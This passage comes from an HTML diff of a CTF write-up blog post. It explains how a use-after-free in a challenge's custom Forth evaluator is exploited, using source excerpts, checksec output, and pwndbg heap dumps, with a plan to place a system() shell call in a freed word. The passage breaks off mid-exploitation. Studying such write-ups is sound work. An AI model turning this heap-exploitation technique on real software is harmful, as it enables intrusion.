+.term-container:has(#hl_mark_a_22:target) .hl_mark_d_22, .term-container:has(#hl_mark_a_22:target) .hl_mark_d_22 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_23:target) .hl_mark_d_23, .term-container:has(#hl_mark_a_23:target) .hl_mark_d_23 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_24:target) .hl_mark_d_24, .term-container:has(#hl_mark_a_24:target) .hl_mark_d_24 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_25:target) .hl_mark_d_25, .term-container:has(#hl_mark_a_25:target) .hl_mark_d_25 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_26:target) .hl_mark_d_26, .term-container:has(#hl_mark_a_26:target) .hl_mark_d_26 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_27:target) .hl_mark_d_27, .term-container:has(#hl_mark_a_27:target) .hl_mark_d_27 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_28:target) .hl_mark_d_28, .term-container:has(#hl_mark_a_28:target) .hl_mark_d_28 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_29:target) .hl_mark_d_29, .term-container:has(#hl_mark_a_29:target) .hl_mark_d_29 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_30:target) .hl_mark_d_30, .term-container:has(#hl_mark_a_30:target) .hl_mark_d_30 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_31:target) .hl_mark_d_31, .term-container:has(#hl_mark_a_31:target) .hl_mark_d_31 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_32:target) .hl_mark_d_32, .term-container:has(#hl_mark_a_32:target) .hl_mark_d_32 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_33:target) .hl_mark_d_33, .term-container:has(#hl_mark_a_33:target) .hl_mark_d_33 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_34:target) .hl_mark_d_34, .term-container:has(#hl_mark_a_34:target) .hl_mark_d_34 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_35:target) .hl_mark_d_35, .term-container:has(#hl_mark_a_35:target) .hl_mark_d_35 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_36:target) .hl_mark_d_36, .term-container:has(#hl_mark_a_36:target) .hl_mark_d_36 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_37:target) .hl_mark_d_37, .term-container:has(#hl_mark_a_37:target) .hl_mark_d_37 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_38:target) .hl_mark_d_38, .term-container:has(#hl_mark_a_38:target) .hl_mark_d_38 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_39:target) .hl_mark_d_39, .term-container:has(#hl_mark_a_39:target) .hl_mark_d_39 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_40:target) .hl_mark_d_40, .term-container:has(#hl_mark_a_40:target) .hl_mark_d_40 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_41:target) .hl_mark_d_41, .term-container:has(#hl_mark_a_41:target) .hl_mark_d_41 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_42:target) .hl_mark_d_42, .term-container:has(#hl_mark_a_42:target) .hl_mark_d_42 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_43:target) .hl_mark_d_43, .term-container:has(#hl_mark_a_43:target) .hl_mark_d_43 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_44:target) .hl_mark_d_44, .term-container:has(#hl_mark_a_44:target) .hl_mark_d_44 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_45:target) .hl_mark_d_45, .term-container:has(#hl_mark_a_45:target) .hl_mark_d_45 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_46:target) .hl_mark_d_46, .term-container:has(#hl_mark_a_46:target) .hl_mark_d_46 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_47:target) .hl_mark_d_47, .term-container:has(#hl_mark_a_47:target) .hl_mark_d_47 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_48:target) .hl_mark_d_48, .term-container:has(#hl_mark_a_48:target) .hl_mark_d_48 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_49:target) .hl_mark_d_49, .term-container:has(#hl_mark_a_49:target) .hl_mark_d_49 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_50:target) .hl_mark_d_50, .term-container:has(#hl_mark_a_50:target) .hl_mark_d_50 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_51:target) .hl_mark_d_51, .term-container:has(#hl_mark_a_51:target) .hl_mark_d_51 .hl_mark_r { animation: var(--anim); }
+</style>
+    <title>forth pwn!</title>
+</head>
+<body>
+    <h1 class="codish" id="top"><span class="slightlyhidden">/<a href="/">root</a>/<a href="/blog">blog</a>/</span>forth_pwn! <div class="subtitle">no stack smashing tho...</div></h1>
+    <p>yay!! b01lersCTF time!!</p>
+    <p>wow, cool pwn... <code>spelling-bee</code></p>
+    <p>what's the description?</p>
+    <p>“forth pwn”...</p>
+    <p>wait...</p>
+    <h1 class="holyshit lessmargin">FORTH PWN????</h1>
+    <p>Ah, nevermind, this is not a pwn <em>written in</em> forth, this is a pwn of a custom forth evaluator. <span class="commented" title="you! reading this! find a way to do this and author a chall maybe?">Would be funny though.</span></p>
+    <h2 class="commented" title="in the age of brainrot and short-form content, i debated not adding a tldr :p - to compensate, please scroll one reel/short/whatever less">TL;DR</h2>
+    <div role="paragraph">
+        The binary is a forth evaluator (compiler? interpreter?) which allows us to define custom words and later forget them.<br>If we:
+        <ul>
+            <li>define a word <code>freed</code>,</li>
+            <li>define a word <code>ref</code> which references <code>freed</code>,</li>
+            <li>and then forget <code>freed</code>,</li>
+        </ul>
+        <code>ref</code> still holds a reference to the now deallocated <code>freed</code> word. This gives us a simple <a href="https://cwe.mitre.org/data/definitions/416.html">use-after-free</a>, which we exploit by doing some heap feng shui by defining words with specific names, and these fill <code>freed</code> with a shell call. Calling <code>ref</code> invokes the “corrupted” word, popping a shell. Yippee!</div>
+    <h2 id="overview">Overview</h2>
+    <p>First step, obviously:</p>
+    <pre class="term-container smallable">spelling-bee $ pwn checksec chall
+[<span class="term-fg34 term-fg1">*</span>] &#39;&#47;home&#47;pingotux&#47;ctf&#47;spelling-bee&#47;chall&#39;
+    Arch:       amd64-64-little
+    RELRO:      <span class="term-fg33">Partial RELRO</span>
+    Stack:      <span class="term-fg31">No canary found</span>
+    NX:         <span class="term-fg32">NX enabled</span>
+    PIE:        <span class="term-fg32">PIE enabled</span>
+    Stripped:   <span class="term-fg31">No</span>
+</pre>
+    <p>The code doesn't use any stack arrays, so the canary is expected to be off. The source is provided but is quite long (~500 lines), so I'll be showing parts of it. You can go check the full code on your own.</p>
+    <p>The libc used is glibc 2.36, a <span class="commented" title="fun fact: the latest release (as of writing), 2.43, removed fastbins and broke every(?) gdb pwn extension. at least on my machine.">relatively modern</span> release. New enough to have a tcache.</p>
+    <p>The challenge implements the nifty stack-based programming language called <a href="https://en.wikipedia.org/wiki/Forth_(programming_language}">Forth</a>. Two stacks are used - one for return addresses from word calls, and one for data. The initial word selection is <span class="commented" title="probably still turing complete though ¯\_(ツ)_/¯">quite limited</span> - <code>:</code> to start a new word definition, <code>;</code> to end a definition and <code>forget</code> to remove a word; some simple stack manipulation instructions, two printing functions and a single arithmetic operator, <code>+</code>.</p>
+    <div class="syntax" name="forth.c">
+	<pre id="primitives">
+...
+
+  <span class="n">dict_t</span> <span class="o">*</span><span class="n">dict</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">":"</span><span class="p">,</span> <span class="n">_col</span><span class="p">,</span> <span class="n">WF_IMM</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">";"</span><span class="p">,</span> <span class="n">_semicolon</span><span class="p">,</span> <span class="n">WF_IMM</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"forget"</span><span class="p">,</span> <span class="n">_forget</span><span class="p">,</span> <span class="n">WF_IMM</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"drop"</span><span class="p">,</span> <span class="n">_drop</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"+"</span><span class="p">,</span> <span class="n">_add</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"dup"</span><span class="p">,</span> <span class="n">_dup</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"2dup"</span><span class="p">,</span> <span class="n">_2dup</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"?dup"</span><span class="p">,</span> <span class="n">_qdup</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"over"</span><span class="p">,</span> <span class="n">_over</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"2over"</span><span class="p">,</span> <span class="n">_2over</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"rot"</span><span class="p">,</span> <span class="n">_rot</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"swap"</span><span class="p">,</span> <span class="n">_swap</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"2swap"</span><span class="p">,</span> <span class="n">_2swap</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">"."</span><span class="p">,</span> <span class="n">_dot</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">add_primitive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dict</span><span class="p">,</span> <span class="s">".s"</span><span class="p">,</span> <span class="n">_sdot</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+...
+</pre>
+    </div>
+    <p>One might also notice a peculiar function which is never used in the code. It's address is also handily printed at the beginning of the program, bypassing PIE.</p>
+    <div class="syntax" name="forth.c">
+	<pre id="dosys">
+<span class="kt">void</span> <span class="nf">dosys</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">val</span><span class="p">);</span>
+  <span class="n">NEXT</span><span class="p">;</span>
+<span class="p">}</span>
+</pre>
+    </div>
+    <p>Moreover, all the stack manipulation we can do is implemented with strict boundary checks. Under the hood, these words use only three macros in various ways: <code>TOP(n)</code>, <code>POP()</code> and <code>PUSH(x)</code>. They expand to these three functions respectively:</p>
+    <div class="syntax" name="forth.c">
+	<pre id="stackprotections">
+...
+
+<span class="k">static</span> <span class="kr">inline</span> <span class="n">cell</span> <span class="o">*</span><span class="nf">stack_top_ptr</span><span class="p">(</span><span class="kt">int</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">g_sp</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">panic</span><span class="p">(</span><span class="s">"data stack underflow"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="o">&amp;</span><span class="n">g_stack</span><span class="p">[</span><span class="n">g_sp</span> <span class="o">-</span> <span class="n">offset</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kr">inline</span> <span class="n">cell</span> <span class="nf">stack_pop</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">g_sp</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">panic</span><span class="p">(</span><span class="s">"data stack underflow"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">g_stack</span><span class="p">[</span><span class="n">g_sp</span><span class="o">--</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">stack_push</span><span class="p">(</span><span class="n">cell</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">g_sp</span> <span class="o">&gt;=</span> <span class="n">STACK_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">panic</span><span class="p">(</span><span class="s">"data stack overflow"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">g_stack</span><span class="p">[</span><span class="o">++</span><span class="n">g_sp</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+...
+</pre>
+    </div>
+    <p>It seems like all these stack manipulation functions are useless. You'd be right. (check <a href="#appendix_a">Appendix A</a> at the end of the writeup)</p>
+    <p>Looking at the definition of the <code>word_t</code> struct, it has a <code>referenced_by</code> field which is properly incremented when referenced, but this field is never checked when forgetting the word:</p>
+    <div class="syntax" name="forth.c">
+	<pre id="word_t">
+...
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">word</span> <span class="p">{</span>
+  <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">length</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">referenced_by</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">code</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">param</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">word_t</span><span class="p">;</span>
+
+...
+
+<span class="kt">bool</span> <span class="nf">delete_word</span><span class="p">(</span><span class="n">dict_t</span> <span class="o">**</span><span class="n">dict</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">dict_t</span> <span class="o">**</span><span class="n">pp</span> <span class="o">=</span> <span class="n">dict</span><span class="p">;</span>
+  <span class="n">dict_t</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="o">*</span><span class="n">dict</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+
+      <span class="n">word_t</span> <span class="o">*</span><span class="n">w</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">word</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">WF_MALLOC_PARAM</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">alloc_name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="o">*</span><span class="n">pp</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">cur</span><span class="p">);</span>
+
+      <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">pp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
+    <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+...
+</pre>
+    </div>
+    <p>If we were to forget a word while it was referenced elsewhere, that'd be a use-after-free waiting for us. Indeed, doing so results in a segfault.</p>
+    <h2 id="exploitation_basics">Exploitation - basics</h2>
+    <div role="paragraph">Let's warm up by checking the order of allocations when creating a new word:
+        <ol><li>the name of our word,</li>
+            <li>a parameter list with 16 blank entries,</li>
+            <li>the <code>word_t</code> for our word, and finally,</li>
+            <li>the <code>dict_t</code> for our word.</li>
+    </ol>
+    Here's our heap after these allocations. Hover over the underlined addresses to see where they refer to, so you get a feeling for the heap's layout. If an address is far away, click it to jump there.</div>
+	<pre class="term-container" id="term1">
+<span class="commented" style="text-decoration-color: var(--lgreen)" title="wow! pwndbg in your browser! what's next? pwn in your browser? wait..."><span class="term-fg32 term-fg1">pwndbg&gt;</span></span> vis
+          ...
+0x563307eba830<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_10"><span>0x563307eba840</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_10">0x00005632cbb310e4	0x0000563307eba810</span></span>	<span class="term-fg35">....2V......3V..</span>    (.s - dict_t)
+0x563307eba850<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_10">0x0000563307eba7e0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>
+0x563307eba860<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000021</span>	<span class="term-fg32">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_0"><span>0x563307eba870</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_0">0x0000006465657266</span>	0x0000000000000000</span>	<span class="term-fg32"><span class="hl_mark_d hl_mark_d_0">freed</span>...........</span>    (freed - char[] name)
+0x563307eba880<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
+<span class="hl_mark_a" id="hl_mark_a_2"><span>0x563307eba890</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_2">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg34">....3V..........</span>    (freed - word_t** param)
+0x563307eba8a0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_2">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>
+          ...
+0x563307eba900<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_2">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>
+0x563307eba910<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_2">0x0000000000000000</span></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_1"><span>0x563307eba920</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_1">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg33">................</span>    (freed - word_t)
+0x563307eba930<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_1">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg33">............2V..</span>
+0x563307eba940<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_1"><a href="#hl_mark_a_2"><span class="hl_mark_r hl_mark_r_2">0x0000563307eba890</span></a></span></span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">....3V..1.......</span>
+0x563307eba950<span class="term-fg36">	<a href="#hl_mark_a_0"><span class="hl_mark_r hl_mark_r_0">0x0000563307eba870</span></a>	<a href="#hl_mark_a_1"><span class="hl_mark_r hl_mark_r_1">0x0000563307eba920</span></a></span>	<span class="term-fg36">p...3V.. ...3V..</span>    (freed - dict_t)
+0x563307eba960<span class="term-fg36">	<a href="#hl_mark_a_10"><span class="hl_mark_r hl_mark_r_10">0x0000563307eba840</span></a>	0x0000000000000001</span>	<span class="term-fg36">@...3V..........</span>
+0x563307eba970<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000020691</span>	<span class="term-fg35">................</span>  &lt;-- Top chunk
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>c
+Continuing.
+</pre>
+    <p>Not much going on for now, so let's make a new word with a reference, like this: <code>: reference freed ;</code></p>
+    <p>The heap acts normal; there aren't even any free chunks to take yet. <code>reference</code>'s argument list includes two words: <code>freed</code>'s <code>word_t</code> and the generic return function.
+	<pre class="term-container" id="term2">
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>vis
+          ...
+0x563307eba830<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_12"><span>0x563307eba840</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_12">0x00005632cbb310e4	0x0000563307eba810</span></span>	<span class="term-fg35">....2V......3V..</span>    (.s - dict_t)
+0x563307eba850<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_12">0x0000563307eba7e0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>
+0x563307eba860<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000021</span>	<span class="term-fg32">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_11"><span>0x563307eba870</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_11">0x0000006465657266</span>	0x0000000000000000</span>	<span class="term-fg32"><span class="hl_mark_d hl_mark_d_11">freed</span>...........</span>    (freed - char[] name)
+0x563307eba880<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
+0x563307eba890<span class="term-fg34">	0x0000563307eba2a0	0x0000000000000000</span>	<span class="term-fg34">....3V..........</span>    (freed - word_t** param)
+0x563307eba8a0<span class="term-fg34">	0x0000000000000000	0x0000000000000000</span>	<span class="term-fg34">................</span>
+          ...
+0x563307eba900<span class="term-fg34">	0x0000000000000000	0x0000000000000000</span>	<span class="term-fg34">................</span>
+0x563307eba910<span class="term-fg34">	0x0000000000000000</span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_3"><span>0x563307eba920</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_3">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg33">................</span>    (freed - word_t, reference-&gt;param[0])
+0x563307eba930<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_3">0x0000000000000001	0x00005632cbb2f41e</span></span>	<span class="term-fg33">............2V..</span>
+0x563307eba940<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_3">0x0000563307eba890</span></span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_15"><span>0x563307eba950</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_15"><a href="#hl_mark_a_11"><span class="hl_mark_r hl_mark_r_11">0x0000563307eba870</span></a>	<a href="#hl_mark_a_3"><span class="hl_mark_r hl_mark_r_3">0x0000563307eba920</span></a></span></span>	<span class="term-fg36">p...3V.. ...3V..</span>    (freed - dict_t)
+0x563307eba960<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_15"><a href="#hl_mark_a_12"><span class="hl_mark_r hl_mark_r_12">0x0000563307eba840</span></a>	0x0000000000000001</span></span>	<span class="term-fg36">@...3V..........</span>
+0x563307eba970<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000021</span>	<span class="term-fg35">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_13"><span>0x563307eba980</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_13">0x636e657265666572	0x0000000000000065</span></span>	<span class="term-fg35"><span class="hl_mark_d hl_mark_d_13">reference</span>.......</span>    (reference - char[] name)
+0x563307eba990<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000091</span>	<span class="term-fg32">................</span>
+<span class="hl_mark_a" id="hl_mark_a_4"><span>0x563307eba9a0</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_4"><a href="#hl_mark_a_3"><span class="hl_mark_r hl_mark_r_3">0x0000563307eba920</span></a>	0x0000563307eba2a0</span></span>	<span class="term-fg32"> ...3V......3V..</span>    (reference - word_t** param)
+0x563307eba9b0<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_4">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+          ...
+0x563307ebaa10<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_4">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+0x563307ebaa20<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_4">0x0000000000000000</span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_14"><span>0x563307ebaa30</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_14">0x0000000000000002	0x0000000000000002</span></span>	<span class="term-fg34">................</span>    (reference - word_t)
+0x563307ebaa40<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_14">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaa50<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_14"><a href="#hl_mark_a_4"><span class="hl_mark_r hl_mark_r_4">0x0000563307eba9a0</span></a></span></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">....3V..1.......</span>
+0x563307ebaa60<span class="term-fg33">	<a href="#hl_mark_a_13"><span class="hl_mark_r hl_mark_r_13">0x0000563307eba980</span></a>	<a href="#hl_mark_a_14"><span class="hl_mark_r hl_mark_r_14">0x0000563307ebaa30</span></a></span>	<span class="term-fg33">....3V..0...3V..</span>    (reference - dict_t)
+0x563307ebaa70<span class="term-fg33">	<a href="#hl_mark_a_15"><span class="hl_mark_r hl_mark_r_15">0x0000563307eba950</span></a>	0x0000000000000001</span>	<span class="term-fg33">P...3V..........</span>
+0x563307ebaa80<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000020581</span>	<span class="term-fg36">................</span>  &lt;-- Top chunk
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>c
+Continuing.
+</pre>
+    <p>We'll also define a dummy word to create a couple chunks and its name should fit in an 0x30 sized chunk. For the sake of brevity, this chunk is referred to as <code>atbfn</code>. It will come in handy later; for now, observe how it's name is the same size as a <code>word_t</code>.</p>
+    <p>To initiate the UAF, let's <code>forget freed</code>, leaving an invalid reference in <code>reference</code>'s argument list.</p>
+	<pre class="term-container" id="term3">
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>vis
+          ...
+0x563307eba830<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_47"><span>0x563307eba840</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_47">0x00005632cbb310e4	0x0000563307eba810</span></span>	<span class="term-fg35">....2V......3V..</span>    (.s - dict_t)
+0x563307eba850<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_47">0x0000563307eba7e0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>
+0x563307eba860<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000021</span>	<span class="term-fg32">........!.......</span>
+0x563307eba870<span class="term-fg32">	0x0000000563307eba	0xa071bf23daf5dc17</span>	<span class="term-fg32">.~0c........#.q.</span>  &lt;-- tcachebins[0x20][0/1]
+0x563307eba880<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
